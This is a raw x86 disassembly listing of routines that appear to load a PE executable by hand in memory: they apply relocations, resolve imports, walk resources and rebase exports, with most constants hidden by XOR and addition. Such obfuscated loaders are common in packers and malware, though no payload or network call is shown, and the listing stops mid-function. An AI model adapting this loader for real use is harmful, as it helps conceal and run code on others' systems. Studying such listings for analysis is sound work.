  425852:	add    eax,edi
  425854:	push   eax
  425855:	mov    eax,DWORD PTR [ebp+0x20]
  425858:	add    eax,0xee
  42585d:	push   eax
  42585e:	mov    eax,DWORD PTR [ebp+0x20]
  425861:	mov    eax,DWORD PTR [eax+0x198]
  425867:	mov    DWORD PTR [ebp-0x70],0x4
  42586e:	push   DWORD PTR [eax]
  425870:	mov    eax,DWORD PTR [ebp+0x10]
  425873:	call   eax
  425875:	test   eax,eax
  425877:	je     0x42589c
  425879:	and    DWORD PTR [ebp+0xc],0x0
  42587d:	cmp    DWORD PTR [ebx+0x50],0x0
  425881:	jbe    0x42589c
  425883:	mov    eax,DWORD PTR [ebp+0x1c]
  425886:	mov    ecx,DWORD PTR [ebp-0x10]
  425889:	sub    ecx,eax
  42588b:	mov    dl,BYTE PTR [ecx+eax*1]
  42588e:	inc    DWORD PTR [ebp+0xc]
  425891:	mov    BYTE PTR [eax],dl
  425893:	mov    edx,DWORD PTR [ebp+0xc]
  425896:	inc    eax
  425897:	cmp    edx,DWORD PTR [ebx+0x50]
  42589a:	jb     0x42588b
  42589c:	mov    edx,DWORD PTR [ebp+0x1c]
  42589f:	mov    ecx,DWORD PTR [edx+0x3c]
  4258a2:	add    ecx,edx
  4258a4:	mov    eax,DWORD PTR [ecx+0xa0]
  4258aa:	mov    ebx,DWORD PTR [ecx+0x28]
  4258ad:	add    eax,edx
  4258af:	sub    edx,DWORD PTR [ebp-0x10]
  4258b2:	add    ebx,DWORD PTR [ebp+0x1c]
  4258b5:	mov    DWORD PTR [ebp+0xc],edx
  4258b8:	mov    DWORD PTR [ebp-0x2c],ecx
  4258bb:	mov    DWORD PTR [ebp-0x14],ebx
  4258be:	mov    DWORD PTR [ebp-0x8],0x0
  4258c5:	jmp    0x425941
  4258c7:	add    edx,0xfffffff8
  4258ca:	shr    edx,1
  4258cc:	mov    DWORD PTR [ebp-0x18],edx
  4258cf:	je     0x42592d
  4258d1:	lea    edx,[eax+0x8]
  4258d4:	mov    DWORD PTR [ebp-0x4],edx
  4258d7:	mov    edx,DWORD PTR [ebp-0x18]
  4258da:	mov    DWORD PTR [ebp-0x18],edx
  4258dd:	mov    edx,DWORD PTR [ebp-0x4]
  4258e0:	movzx  edx,WORD PTR [edx]
  4258e3:	mov    DWORD PTR [ebp-0x24],edx
  4258e6:	and    edx,0xfff
  4258ec:	mov    DWORD PTR [ebp-0x28],edx
  4258ef:	mov    edx,DWORD PTR [ebp-0x24]
  4258f2:	shr    edx,0xc
  4258f5:	add    edx,0xffcd8d0a
  4258fb:	xor    edx,esi
  4258fd:	cmp    edx,0xf89c85a2
  425903:	jne    0x425924
  425905:	mov    edx,DWORD PTR [ebp-0x28]
  425908:	add    edx,DWORD PTR [ebp+0x1c]
  42590b:	mov    ebx,DWORD PTR [eax]
  42590d:	cmp    DWORD PTR [ebx+edx*1],0x0
  425911:	je     0x425921
  425913:	mov    ecx,DWORD PTR [ebp+0xc]
  425916:	add    ecx,DWORD PTR [ebx+edx*1]
  425919:	mov    ebx,DWORD PTR [eax]
  42591b:	mov    DWORD PTR [edx+ebx*1],ecx
  42591e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425921:	mov    ebx,DWORD PTR [ebp-0x14]
  425924:	add    DWORD PTR [ebp-0x4],0x2
  425928:	dec    DWORD PTR [ebp-0x18]
  42592b:	jne    0x4258dd
  42592d:	mov    edx,DWORD PTR [ebp-0xc]
  425930:	add    DWORD PTR [ebp-0x8],edx
  425933:	mov    edx,DWORD PTR [ebp-0x8]
  425936:	cmp    edx,DWORD PTR [ecx+0xa4]
  42593c:	jae    0x42594f
  42593e:	add    eax,DWORD PTR [ebp-0xc]
  425941:	mov    edx,DWORD PTR [eax+0x4]
  425944:	mov    DWORD PTR [ebp-0xc],edx
  425947:	test   edx,edx
  425949:	jne    0x4258c7
  42594f:	mov    eax,DWORD PTR [ebp-0x10]
  425952:	mov    DWORD PTR [ebp-0x6c],eax
  425955:	mov    DWORD PTR [ebp-0x70],0x4
  42595c:	mov    eax,DWORD PTR [ecx+0x50]
  42595f:	mov    DWORD PTR [ebp-0x68],eax
  425962:	mov    eax,DWORD PTR [ebp-0x1c]
  425965:	xor    eax,esi
  425967:	add    eax,edi
  425969:	mov    DWORD PTR [ebp-0x64],eax
  42596c:	lea    eax,[ebp-0x20]
  42596f:	mov    DWORD PTR [ebp-0x60],eax
  425972:	lea    eax,[ebp-0x70]
  425975:	push   eax
  425976:	mov    eax,DWORD PTR [ebp+0x8]
  425979:	xor    eax,esi
  42597b:	add    eax,edi
  42597d:	push   eax
  42597e:	mov    eax,DWORD PTR [ebp+0x20]
  425981:	add    eax,0xee
  425986:	push   eax
  425987:	mov    eax,DWORD PTR [ebp+0x20]
  42598a:	mov    eax,DWORD PTR [eax+0x198]
  425990:	push   DWORD PTR [eax]
  425992:	mov    eax,DWORD PTR [ebp+0x10]
  425995:	call   eax
  425997:	mov    eax,DWORD PTR [ebp+0x20]
  42599a:	mov    eax,DWORD PTR [eax+0x180]
  4259a0:	add    eax,DWORD PTR [ebp+0xc]
  4259a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259a6:	push   DWORD PTR [ebp+0x18]
  4259a9:	mov    DWORD PTR [eax],ecx
  4259ab:	push   DWORD PTR [ebp+0x14]
  4259ae:	push   DWORD PTR [ebp+0x1c]
  4259b1:	call   ebx
  4259b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259b6:	add    ecx,DWORD PTR [ebp+0x20]
  4259b9:	lea    eax,[ebp+0x4]
  4259bc:	mov    DWORD PTR [ebp+0x20],ecx
  4259bf:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c2:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c5:	mov    edx,DWORD PTR [ecx+0x190]
  4259cb:	mov    ecx,DWORD PTR [ebp+0x20]
  4259ce:	mov    ecx,DWORD PTR [ecx+0x18c]
  4259d4:	mov    esi,DWORD PTR [ecx]
  4259d6:	cmp    DWORD PTR [eax],esi
  4259d8:	jb     0x4259f9
  4259da:	mov    esi,DWORD PTR [edx]
  4259dc:	mov    edi,DWORD PTR [edx]
  4259de:	mov    esi,DWORD PTR [esi+0x3c]
  4259e1:	lea    esi,[edi+esi*1+0x50]
  4259e5:	mov    edi,DWORD PTR [ecx]
  4259e7:	add    edi,DWORD PTR [esi]
  4259e9:	cmp    DWORD PTR [eax],edi
  4259eb:	jae    0x4259f9
  4259ed:	mov    esi,DWORD PTR [ecx]
  4259ef:	mov    ecx,DWORD PTR [eax]
  4259f1:	mov    edx,DWORD PTR [edx]
  4259f3:	sub    ecx,esi
  4259f5:	add    edx,ecx
  4259f7:	mov    DWORD PTR [eax],edx
  4259f9:	mov    eax,DWORD PTR [ebp+0xc]
  4259fc:	jmp    0x425a00
  4259fe:	xor    eax,eax
  425a00:	pop    edi
  425a01:	pop    esi
  425a02:	pop    ebx
  425a03:	leave  
  425a04:	ret    0x1c
  425a07:	push   ebp
  425a08:	mov    ebp,esp
  425a0a:	sub    esp,0x1c
  425a0d:	push   esi
  425a0e:	mov    esi,eax
  425a10:	mov    eax,DWORD PTR [ecx+0x190]
  425a16:	cmp    DWORD PTR [eax],0x0
  425a19:	je     0x425b29
  425a1f:	test   edx,edx
  425a21:	je     0x425b29
  425a27:	test   esi,esi
  425a29:	je     0x425b29
  425a2f:	mov    eax,DWORD PTR [esi+0x88]
  425a35:	test   eax,eax
  425a37:	je     0x425b24
  425a3d:	cmp    DWORD PTR [esi+0x8c],0x10
  425a44:	je     0x425b24
  425a4a:	cmp    DWORD PTR [esi+0x34],edx
  425a4d:	je     0x425b24
  425a53:	mov    esi,DWORD PTR [ecx+0x18c]
  425a59:	and    DWORD PTR [ebp-0x10],0x0
  425a5d:	mov    ecx,edx
  425a5f:	sub    ecx,DWORD PTR [esi]
  425a61:	add    eax,edx
  425a63:	movzx  edx,WORD PTR [eax+0xc]
  425a67:	mov    DWORD PTR [ebp-0x1c],ecx
  425a6a:	movzx  ecx,WORD PTR [eax+0xe]
  425a6e:	add    ecx,edx
  425a70:	je     0x425b24
  425a76:	lea    ecx,[eax+0x14]
  425a79:	push   ebx
  425a7a:	mov    DWORD PTR [ebp-0x18],ecx
  425a7d:	mov    esi,0x7fffffff
  425a82:	push   edi
  425a83:	test   DWORD PTR [ecx],esi
  425a85:	je     0x425b06
  425a87:	mov    edx,DWORD PTR [ecx]
  425a89:	and    DWORD PTR [ebp-0xc],0x0
  425a8d:	and    edx,esi
  425a8f:	add    edx,eax
  425a91:	movzx  edi,WORD PTR [edx+0xe]
  425a95:	movzx  ebx,WORD PTR [edx+0xc]
  425a99:	add    edi,ebx
  425a9b:	je     0x425b06
  425a9d:	lea    ecx,[edx+0x14]
  425aa0:	mov    DWORD PTR [ebp-0x14],ecx
  425aa3:	test   DWORD PTR [ecx],esi
  425aa5:	je     0x425ae8
  425aa7:	mov    ecx,DWORD PTR [ecx]
  425aa9:	and    DWORD PTR [ebp-0x8],0x0
  425aad:	and    ecx,esi
  425aaf:	add    ecx,eax
  425ab1:	movzx  edi,WORD PTR [ecx+0xe]
  425ab5:	movzx  ebx,WORD PTR [ecx+0xc]
  425ab9:	add    edi,ebx
  425abb:	je     0x425ae8
  425abd:	lea    edi,[ecx+0x14]
  425ac0:	mov    DWORD PTR [ebp-0x4],edi
  425ac3:	mov    edi,DWORD PTR [ebp-0x4]
  425ac6:	mov    edi,DWORD PTR [edi]
  425ac8:	test   edi,edi
  425aca:	je     0x425ad2
  425acc:	mov    ebx,DWORD PTR [ebp-0x1c]
  425acf:	add    DWORD PTR [edi+eax*1],ebx
  425ad2:	movzx  edi,WORD PTR [ecx+0xe]
  425ad6:	movzx  ebx,WORD PTR [ecx+0xc]
  425ada:	inc    DWORD PTR [ebp-0x8]
  425add:	add    DWORD PTR [ebp-0x4],0x8
  425ae1:	add    edi,ebx
  425ae3:	cmp    DWORD PTR [ebp-0x8],edi
  425ae6:	jb     0x425ac3
  425ae8:	movzx  edi,WORD PTR [edx+0xe]
  425aec:	movzx  ebx,WORD PTR [edx+0xc]
  425af0:	mov    ecx,DWORD PTR [ebp-0x14]
  425af3:	inc    DWORD PTR [ebp-0xc]
  425af6:	add    ecx,0x8
  425af9:	add    edi,ebx
  425afb:	mov    DWORD PTR [ebp-0x14],ecx
  425afe:	cmp    DWORD PTR [ebp-0xc],edi
  425b01:	jb     0x425aa3
  425b03:	mov    ecx,DWORD PTR [ebp-0x18]
  425b06:	movzx  edx,WORD PTR [eax+0xe]
  425b0a:	movzx  edi,WORD PTR [eax+0xc]
  425b0e:	inc    DWORD PTR [ebp-0x10]
  425b11:	add    ecx,0x8
  425b14:	add    edx,edi
  425b16:	mov    DWORD PTR [ebp-0x18],ecx
  425b19:	cmp    DWORD PTR [ebp-0x10],edx
  425b1c:	jb     0x425a83
  425b22:	pop    edi
  425b23:	pop    ebx
  425b24:	xor    eax,eax
  425b26:	inc    eax
  425b27:	jmp    0x425b2b
  425b29:	xor    eax,eax
  425b2b:	pop    esi
  425b2c:	leave  
  425b2d:	ret    
  425b2e:	push   ebp
  425b2f:	mov    ebp,esp
  425b31:	mov    ecx,DWORD PTR [ecx+0x190]
  425b37:	mov    eax,DWORD PTR [ebp+0xc]
  425b3a:	sub    esp,0x10
  425b3d:	push   ebx
  425b3e:	xor    ebx,ebx
  425b40:	push   esi
  425b41:	push   edi
  425b42:	cmp    DWORD PTR [ecx],ebx
  425b44:	je     0x425bcc
  425b4a:	cmp    eax,ebx
  425b4c:	je     0x425bcc
  425b4e:	cmp    DWORD PTR [eax+0x78],ebx
  425b51:	jne    0x425b58
  425b53:	xor    eax,eax
  425b55:	inc    eax
  425b56:	jmp    0x425bce
  425b58:	mov    eax,DWORD PTR [eax+0x78]
  425b5b:	add    eax,DWORD PTR [ebp+0x8]
  425b5e:	mov    ecx,DWORD PTR [eax+0x1c]
  425b61:	mov    edx,DWORD PTR [eax+0x24]
  425b64:	mov    esi,DWORD PTR [eax+0x14]
  425b67:	mov    edi,DWORD PTR [eax+0x18]
  425b6a:	add    ecx,DWORD PTR [ebp+0x8]
  425b6d:	add    edx,DWORD PTR [ebp+0x8]
  425b70:	mov    DWORD PTR [ebp-0x4],esi
  425b73:	cmp    esi,edi
  425b75:	ja     0x425b7a
  425b77:	mov    DWORD PTR [ebp-0x4],edi
  425b7a:	mov    DWORD PTR [ebp-0x8],ebx
  425b7d:	cmp    DWORD PTR [ebp-0x4],ebx
  425b80:	jbe    0x425b53
  425b82:	cmp    ebx,DWORD PTR [eax+0x14]
  425b85:	jae    0x425b8d
  425b87:	movzx  esi,WORD PTR [edx+ebx*2]
  425b8b:	jmp    0x425b8f
  425b8d:	mov    esi,ebx
  425b8f:	lea    esi,[ecx+esi*4]
  425b92:	mov    edi,DWORD PTR [esi]
  425b94:	test   edi,edi
  425b96:	je     0x425bc1
  425b98:	add    edi,DWORD PTR [ebp+0x8]
  425b9b:	mov    DWORD PTR [ebp-0x10],edi
  425b9e:	cmp    edi,eax
  425ba0:	jbe    0x425bb2
  425ba2:	mov    ebx,DWORD PTR [ebp+0xc]
  425ba5:	mov    ebx,DWORD PTR [ebx+0x7c]
  425ba8:	add    ebx,eax
  425baa:	cmp    edi,ebx
  425bac:	jae    0x425bb2
  425bae:	mov    esi,DWORD PTR [esi]
  425bb0:	jmp    0x425bba
  425bb2:	sub    edi,DWORD PTR [ebp+0x8]
  425bb5:	mov    DWORD PTR [esi],edi
  425bb7:	mov    esi,DWORD PTR [ebp-0x10]
  425bba:	test   esi,esi
  425bbc:	je     0x425bcc
  425bbe:	mov    ebx,DWORD PTR [ebp-0x8]
  425bc1:	inc    ebx
  425bc2:	mov    DWORD PTR [ebp-0x8],ebx
  425bc5:	cmp    ebx,DWORD PTR [ebp-0x4]
  425bc8:	jb     0x425b82
  425bca:	jmp    0x425b53
  425bcc:	xor    eax,eax
  425bce:	pop    edi
  425bcf:	pop    esi
  425bd0:	pop    ebx
  425bd1:	leave  
  425bd2:	ret    0x8
  425bd5:	push   ebp
  425bd6:	mov    ebp,esp
  425bd8:	sub    esp,0x2c
  425bdb:	mov    edx,0xf89c85a5
  425be0:	mov    DWORD PTR [ebp-0x4],edx
  425be3:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  425bea:	mov    eax,DWORD PTR [ebp-0x4]
  425bed:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf0:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf3:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf9:	mov    ecx,DWORD PTR [ebp-0x4]
  425bfc:	push   ebx
  425bfd:	mov    ebx,DWORD PTR [ebp+0x10]
  425c00:	push   esi
  425c01:	mov    esi,0x75108af
  425c06:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  425c0d:	mov    ecx,DWORD PTR [ebp-0x4]
  425c10:	mov    ebx,DWORD PTR [ebx+0x190]
  425c16:	push   edi
  425c17:	mov    edi,0x3272f6
  425c1c:	xor    ecx,esi
  425c1e:	xor    eax,esi
  425c20:	add    eax,edi
  425c22:	add    ecx,edi
  425c24:	mov    DWORD PTR [ebp-0x18],eax
  425c27:	cmp    ecx,DWORD PTR [ebx]
  425c29:	je     0x425eaa
  425c2f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c32:	mov    ecx,DWORD PTR [ebp+0xc]
  425c35:	xor    ebx,esi
  425c37:	add    ebx,edi
  425c39:	cmp    ebx,ecx
  425c3b:	je     0x425eaa
  425c41:	mov    ebx,DWORD PTR [ebp-0x4]
  425c44:	mov    ecx,DWORD PTR [ecx+0x80]
  425c4a:	xor    ebx,esi
  425c4c:	add    ebx,edi
  425c4e:	cmp    ecx,ebx
  425c50:	je     0x425ea5
  425c56:	add    ecx,DWORD PTR [ebp+0x8]
  425c59:	mov    DWORD PTR [ebp-0x2c],ecx
  425c5c:	mov    ebx,edx
  425c5e:	xor    ebx,esi
  425c60:	add    ebx,edi
  425c62:	mov    DWORD PTR [ebp-0x10],ebx
  425c65:	mov    ebx,DWORD PTR [ebp-0x10]
  425c68:	cmp    ebx,edx
  425c6a:	je     0x425c7e
  425c6c:	mov    edx,DWORD PTR [ebp-0x10]
  425c6f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c72:	imul   edx,edx,0x14
  425c75:	xor    ebx,esi
  425c77:	add    ebx,edi
  425c79:	cmp    DWORD PTR [edx+ecx*1],ebx
  425c7c:	jne    0x425c95
  425c7e:	mov    edx,DWORD PTR [ebp-0x10]
  425c81:	mov    ebx,DWORD PTR [ebp-0x4]
  425c84:	imul   edx,edx,0x14
  425c87:	xor    ebx,esi
  425c89:	add    ebx,edi
  425c8b:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  425c8f:	je     0x425e97
  425c95:	mov    eax,DWORD PTR [ebp-0x4]
  425c98:	mov    ebx,DWORD PTR [ebp-0x4]
  425c9b:	mov    eax,DWORD PTR [ebp-0x10]
  425c9e:	imul   eax,eax,0x14
  425ca1:	add    eax,ecx
  425ca3:	mov    ecx,DWORD PTR [eax+0x10]
  425ca6:	add    ecx,DWORD PTR [ebp+0x8]
  425ca9:	xor    ebx,esi
  425cab:	mov    DWORD PTR [ebp-0x1c],ecx
  425cae:	mov    ecx,DWORD PTR [ebp-0x4]
  425cb1:	mov    edx,DWORD PTR [ebp-0x4]
  425cb4:	xor    ecx,esi
  425cb6:	add    ecx,edi
  425cb8:	xor    edx,esi
  425cba:	mov    DWORD PTR [ebp-0x24],ecx
  425cbd:	mov    ecx,DWORD PTR [eax]
  425cbf:	add    edx,edi
  425cc1:	add    ebx,edi
  425cc3:	cmp    ecx,edx
  425cc5:	je     0x425ccd
  425cc7:	add    ecx,DWORD PTR [ebp+0x8]
  425cca:	mov    DWORD PTR [ebp-0x24],ecx
  425ccd:	mov    ecx,DWORD PTR [ebp-0x4]
  425cd0:	xor    ecx,esi
  425cd2:	add    ecx,DWORD PTR [eax+0xc]
  425cd5:	mov    eax,DWORD PTR [ebp+0x8]
  425cd8:	lea    eax,[ecx+eax*1+0x3272f6]
  425cdf:	mov    DWORD PTR [ebp+0xc],eax
  425ce2:	mov    DWORD PTR [ebp-0x28],0xf89c85a0
  425ce9:	mov    eax,DWORD PTR [ebp+0x10]
  425cec:	push   DWORD PTR [ebp+0xc]
  425cef:	mov    eax,DWORD PTR [eax+0x1e0]
  425cf5:	call   DWORD PTR [eax]
  425cf7:	mov    ecx,DWORD PTR [ebp-0x4]
  425cfa:	xor    ecx,esi
  425cfc:	add    ecx,edi
  425cfe:	mov    DWORD PTR [ebp-0xc],eax
  425d01:	cmp    ecx,eax
  425d03:	jne    0x425d17
  425d05:	mov    eax,DWORD PTR [ebp+0x10]
  425d08:	push   DWORD PTR [ebp+0xc]
  425d0b:	mov    eax,DWORD PTR [eax+0x1e0]
  425d11:	call   DWORD PTR [eax+0xc]
  425d14:	mov    DWORD PTR [ebp-0xc],eax
  425d17:	mov    DWORD PTR [ebp-0x20],0x7f661b2c
  425d1e:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  425d25:	mov    eax,DWORD PTR [ebp-0x4]
  425d28:	xor    eax,esi
  425d2a:	add    eax,edi
  425d2c:	cmp    eax,DWORD PTR [ebp-0xc]
  425d2f:	jne    0x425d54
  425d31:	mov    eax,DWORD PTR [ebp-0x8]
  425d34:	mov    ecx,DWORD PTR [ebp-0x20]
  425d37:	xor    eax,esi
  425d39:	xor    ecx,esi
  425d3b:	lea    ebx,[ebx+eax*1+0x3272f6]
  425d42:	mov    eax,DWORD PTR [ebp+0x10]
  425d45:	mov    eax,DWORD PTR [eax+0x1e0]
  425d4b:	add    ecx,edi
  425d4d:	imul   ecx,ebx
  425d50:	push   ecx
  425d51:	call   DWORD PTR [eax+0x24]
  425d54:	mov    eax,DWORD PTR [ebp-0x4]
  425d57:	xor    eax,esi
  425d59:	add    eax,edi
  425d5b:	cmp    eax,DWORD PTR [ebp-0xc]
  425d5e:	jne    0x425d6f
  425d60:	mov    eax,DWORD PTR [ebp-0x28]
  425d63:	xor    eax,esi
  425d65:	add    eax,edi
  425d67:	cmp    ebx,eax
  425d69:	jbe    0x425ce9
  425d6f:	mov    eax,DWORD PTR [ebp-0x4]
  425d72:	xor    eax,esi
  425d74:	add    eax,edi
  425d76:	cmp    eax,DWORD PTR [ebp-0xc]
  425d79:	jne    0x425d92
  425d7b:	mov    eax,DWORD PTR [ebp-0x8]
  425d7e:	mov    ecx,DWORD PTR [ebp-0x18]
  425d81:	xor    eax,esi
  425d83:	lea    eax,[ecx+eax*1+0x3272f6]
  425d8a:	mov    DWORD PTR [ebp-0x18],eax
  425d8d:	jmp    0x425e81
  425d92:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  425d99:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  425da0:	mov    ebx,DWORD PTR [ebp-0x4]
  425da3:	xor    ebx,esi
  425da5:	add    ebx,edi
  425da7:	jmp    0x425e6e
  425dac:	mov    eax,DWORD PTR [ebp-0x4]
  425daf:	xor    eax,esi
  425db1:	add    eax,edi
  425db3:	mov    DWORD PTR [ebp-0x14],eax
  425db6:	mov    eax,DWORD PTR [ebp-0x4]
  425db9:	xor    eax,esi
  425dbb:	add    eax,edi
  425dbd:	mov    DWORD PTR [ebp+0xc],eax
  425dc0:	mov    ecx,DWORD PTR [ebp-0x4]
  425dc3:	mov    eax,DWORD PTR [ebp-0x24]
  425dc6:	xor    ecx,esi
  425dc8:	add    ecx,edi
  425dca:	cmp    ecx,eax
  425dcc:	je     0x425dd4
  425dce:	mov    eax,DWORD PTR [eax+ebx*4]
  425dd1:	mov    DWORD PTR [ebp-0x14],eax
  425dd4:	mov    eax,DWORD PTR [ebp-0x1c]
  425dd7:	mov    eax,DWORD PTR [eax+ebx*4]
  425dda:	mov    DWORD PTR [ebp+0xc],eax
  425ddd:	mov    eax,DWORD PTR [ebp-0x4]
  425de0:	mov    ecx,DWORD PTR [ebp-0x14]
  425de3:	xor    eax,esi
  425de5:	add    eax,edi
  425de7:	cmp    eax,ecx
  425de9:	je     0x425e14
  425deb:	mov    eax,DWORD PTR [ebp-0x4]
  425dee:	mov    ecx,DWORD PTR [ebp-0x14]
  425df1:	xor    eax,esi
  425df3:	add    eax,edi
  425df5:	shr    ecx,0x1f
  425df8:	cmp    eax,ecx
  425dfa:	je     0x425e14
  425dfc:	mov    ecx,DWORD PTR [ebp-0x14]
  425dff:	mov    eax,DWORD PTR [ebp+0x10]
  425e02:	mov    eax,DWORD PTR [eax+0x1e0]
  425e08:	movzx  ecx,cx
  425e0b:	push   ecx
  425e0c:	push   DWORD PTR [ebp-0xc]
  425e0f:	call   DWORD PTR [eax+0x8]
  425e12:	jmp    0x425e2d
  425e14:	mov    eax,DWORD PTR [ebp+0xc]
  425e17:	add    eax,DWORD PTR [ebp+0x8]
  425e1a:	mov    ecx,DWORD PTR [ebp+0x10]
  425e1d:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425e23:	add    eax,0x2
  425e26:	push   eax
  425e27:	push   DWORD PTR [ebp-0xc]
  425e2a:	call   DWORD PTR [ecx+0x8]
  425e2d:	mov    DWORD PTR [ebp+0xc],eax
  425e30:	mov    eax,DWORD PTR [ebp-0x4]
  425e33:	mov    ecx,DWORD PTR [ebp+0xc]
  425e36:	xor    eax,esi
  425e38:	add    eax,edi
  425e3a:	cmp    eax,ecx
  425e3c:	mov    eax,DWORD PTR [ebp-0x8]
  425e3f:	jne    0x425e52
  425e41:	mov    ecx,DWORD PTR [ebp-0x18]
  425e44:	xor    eax,esi
  425e46:	lea    eax,[ecx+eax*1+0x3272f6]
  425e4d:	mov    DWORD PTR [ebp-0x18],eax
  425e50:	jmp    0x425e62
  425e52:	mov    ecx,DWORD PTR [ebp+0xc]
  425e55:	xor    eax,esi
  425e57:	add    eax,edi
  425e59:	imul   eax,ecx
  425e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e5f:	mov    DWORD PTR [ecx+ebx*4],eax
  425e62:	mov    eax,DWORD PTR [ebp-0x8]
  425e65:	xor    eax,esi
  425e67:	lea    ebx,[ebx+eax*1+0x3272f6]
  425e6e:	mov    eax,DWORD PTR [ebp-0x4]
  425e71:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e74:	xor    eax,esi
  425e76:	add    eax,edi
  425e78:	cmp    DWORD PTR [ecx+ebx*4],eax
  425e7b:	jne    0x425dac
  425e81:	mov    edx,DWORD PTR [ebp-0x10]
  425e84:	mov    eax,DWORD PTR [ebp-0x18]
  425e87:	mov    ecx,DWORD PTR [ebp-0x2c]
  425e8a:	sub    edx,0x3272f5
  425e90:	xor    edx,esi
  425e92:	jmp    0x425c5c
  425e97:	mov    ecx,DWORD PTR [ebp-0x4]
  425e9a:	xor    ecx,esi
  425e9c:	add    ecx,edi
  425e9e:	cmp    eax,ecx
  425ea0:	mov    eax,DWORD PTR [ebp-0x4]
  425ea3:	jne    0x425ead
  425ea5:	mov    eax,DWORD PTR [ebp-0x8]
  425ea8:	jmp    0x425ead
  425eaa:	mov    eax,DWORD PTR [ebp-0x4]
  425ead:	xor    eax,esi
  425eaf:	add    eax,edi
  425eb1:	pop    edi
  425eb2:	pop    esi
  425eb3:	pop    ebx
  425eb4:	leave  
  425eb5:	ret    0xc
  425eb8:	push   ebp
  425eb9:	mov    ebp,esp
  425ebb:	sub    esp,0x28
  425ebe:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  425ec5:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  425ecc:	mov    eax,DWORD PTR [ebp+0xc]
  425ecf:	mov    DWORD PTR [ebp+0xc],eax
  425ed2:	push   esi
  425ed3:	mov    eax,eax
  425ed5:	mov    eax,DWORD PTR [ebp-0x4]
  425ed8:	mov    esi,DWORD PTR [ebp+0x8]
  425edb:	mov    ecx,0x75108af
  425ee0:	xor    eax,ecx
  425ee2:	mov    edx,0x3272f6
  425ee7:	add    eax,edx
  425ee9:	cmp    esi,eax
  425eeb:	je     0x426012
  425ef1:	mov    eax,DWORD PTR [ebp+0x8]
  425ef4:	mov    esi,DWORD PTR [ebp+0x8]
  425ef7:	add    esi,DWORD PTR [eax+0x3c]
  425efa:	push   edi
  425efb:	mov    DWORD PTR [ebp+0xc],esi
  425efe:	mov    DWORD PTR [ebp-0x1c],0xf89c85a0
  425f05:	mov    eax,DWORD PTR [ebp-0x1c]
  425f08:	mov    esi,DWORD PTR [ebp-0x4]
  425f0b:	mov    edi,DWORD PTR [ebp+0xc]
  425f0e:	xor    esi,ecx
  425f10:	xor    eax,ecx
  425f12:	add    esi,edx
  425f14:	cmp    DWORD PTR [edi+eax*8+0x1939828],esi
  425f1b:	je     0x42600c
  425f21:	mov    esi,DWORD PTR [ebp+0xc]
  425f24:	mov    eax,DWORD PTR [ebp+0x8]
  425f27:	add    eax,DWORD PTR [esi+0xa0]
  425f2d:	mov    esi,DWORD PTR [ebp+0x8]
  425f30:	mov    edi,DWORD PTR [ebp+0xc]
  425f33:	sub    esi,DWORD PTR [edi+0x34]
  425f36:	mov    edi,DWORD PTR [ebp-0x4]
  425f39:	xor    edi,ecx
  425f3b:	add    edi,edx
  425f3d:	mov    DWORD PTR [ebp-0x24],esi
  425f40:	cmp    esi,edi
  425f42:	je     0x42600c
  425f48:	mov    esi,DWORD PTR [ebp-0x4]
  425f4b:	xor    esi,ecx
  425f4d:	add    esi,edx
  425f4f:	mov    DWORD PTR [ebp-0x8],esi
  425f52:	push   ebx
  425f53:	mov    DWORD PTR [ebp-0x10],0xf89c85a2
  425f5a:	jmp    0x425ff6
  425f5f:	mov    esi,DWORD PTR [ebp-0x4]
  425f62:	xor    esi,ecx
  425f64:	lea    edi,[ebx-0x8]
  425f67:	add    esi,edx
  425f69:	shr    edi,1
  425f6b:	cmp    esi,edi
  425f6d:	jae    0x425fdc
  425f6f:	sub    edi,esi
  425f71:	lea    ebx,[eax+esi*2+0x8]
  425f75:	mov    DWORD PTR [ebp-0x18],edi
  425f78:	movzx  esi,WORD PTR [ebx]
  425f7b:	and    esi,0xfff
  425f81:	mov    DWORD PTR [ebp-0x14],esi
  425f84:	mov    edi,DWORD PTR [ebp-0x14]
  425f87:	mov    esi,DWORD PTR [eax]
  425f89:	sub    esi,edx
  425f8b:	add    edi,esi
  425f8d:	movzx  esi,WORD PTR [ebx]
  425f90:	shr    esi,0xc
  425f93:	xor    edi,ecx
  425f95:	mov    DWORD PTR [ebp-0x20],edi
  425f98:	mov    DWORD PTR [ebp-0x14],esi
  425f9b:	mov    esi,DWORD PTR [ebp-0x20]
  425f9e:	mov    edi,DWORD PTR [ebp+0x8]
  425fa1:	xor    esi,ecx
  425fa3:	lea    esi,[esi+edi*1+0x3272f6]
  425faa:	mov    DWORD PTR [ebp-0x20],esi
  425fad:	mov    esi,DWORD PTR [ebp-0x10]
  425fb0:	mov    edi,DWORD PTR [ebp-0x14]
  425fb3:	xor    esi,ecx
  425fb5:	add    esi,edx
  425fb7:	cmp    edi,esi
  425fb9:	jne    0x425fd1
  425fbb:	mov    esi,DWORD PTR [ebp-0x10]
  425fbe:	mov    edi,DWORD PTR [ebp-0x14]
  425fc1:	xor    esi,ecx
  425fc3:	add    esi,edx
  425fc5:	cmp    edi,esi
  425fc7:	jne    0x425fd1
  425fc9:	mov    esi,DWORD PTR [ebp-0x20]
  425fcc:	mov    edi,DWORD PTR [ebp-0x24]
  425fcf:	add    DWORD PTR [esi],edi
  425fd1:	add    ebx,0x2
  425fd4:	dec    DWORD PTR [ebp-0x18]
  425fd7:	jne    0x425f78
  425fd9:	mov    ebx,DWORD PTR [ebp-0xc]
  425fdc:	add    DWORD PTR [ebp-0x8],ebx
